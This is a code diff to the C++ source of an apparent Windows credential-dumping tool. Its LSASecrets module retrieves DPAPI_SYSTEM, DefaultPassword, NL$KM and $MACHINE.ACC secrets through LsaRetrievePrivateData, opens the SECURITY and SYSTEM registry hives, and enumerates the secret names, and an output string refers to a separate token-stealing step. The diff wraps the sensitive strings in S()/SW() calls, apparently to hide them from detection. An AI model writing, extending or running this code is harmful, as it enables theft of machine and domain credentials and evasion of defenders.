@@ -45,27 +45,26 @@ std::string LSASecrets::DumpViaAPI() {
                [&](){ char b[16]; snprintf(b,sizeof(b),"%08X",(DWORD)st); return std::string(b); }() +
                " (need SYSTEM token — run tokensteal first)";
 
-    static const wchar_t* secrets[] = {
-        L"DPAPI_SYSTEM",
-        L"DefaultPassword",
-        L"NL$KM",
-        L"$MACHINE.ACC",
-        NULL
+    static const std::vector<std::wstring> secrets = {
+        SW(L"DPAPI_SYSTEM"),
+        SW(L"DefaultPassword"),
+        SW(L"NL$KM"),
+        SW(L"$MACHINE.ACC"),
     };
 
     std::string r = "LSA Secrets via LsaRetrievePrivateData:\n";
     r += "(Detection: Security event 4662 for each retrieval)\n\n";
 
-    for (int i = 0; secrets[i]; i++) {
+    for (const auto& sec : secrets) {
         LSA_UNICODE_STRING name;
-        name.Buffer        = (PWSTR)secrets[i];
-        name.Length        = (USHORT)(wcslen(secrets[i]) * 2);
+        name.Buffer        = (PWSTR)sec.data();
+        name.Length        = (USHORT)(sec.size() * 2);
         name.MaximumLength = name.Length + 2;
 
         PLSA_UNICODE_STRING out = NULL;
         NTSTATUS st2 = LsaRetrievePrivateData(hLsa, &name, &out);
         char wname[128] = {};
-        WideCharToMultiByte(CP_ACP, 0, secrets[i], -1, wname, sizeof(wname)-1, NULL, NULL);
+        WideCharToMultiByte(CP_ACP, 0, sec.data(), -1, wname, sizeof(wname)-1, NULL, NULL);
         if (st2 == STATUS_SUCCESS && out) {
             r += "  " + std::string(wname) + " (" + std::to_string(out->Length) + " bytes):\n";
             r += "    " + HexDump((BYTE*)out->Buffer, out->Length) + "\n";
@@ -105,8 +104,8 @@ std::string LSASecrets::DumpViaRegistry() {
 
     // Save SECURITY and SYSTEM hives
     HKEY hSec, hSys;
-    LONG r1 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY", 0, READ_CONTROL|KEY_READ, &hSec);
-    LONG r2 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM",   0, READ_CONTROL|KEY_READ, &hSys);
+    LONG r1 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SECURITY").c_str(), 0, READ_CONTROL|KEY_READ, &hSec);
+    LONG r2 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SYSTEM").c_str(),   0, READ_CONTROL|KEY_READ, &hSys);
 
     std::string r = "LSASecrets via registry hive save:\n";
     if (r1 != ERROR_SUCCESS)
@@ -144,7 +143,7 @@ std::string LSASecrets::ListSecretNames() {
 
     HKEY hk;
     std::string r = "LSA Secret key names (HKLM\\SECURITY\\Policy\\Secrets):\n";
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets",
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SECURITY\\Policy\\Secrets").c_str(),
                       0, KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS) {
         LsaClose(hLsa);
         return r + "  Cannot enumerate (need SYSTEM token)\n";
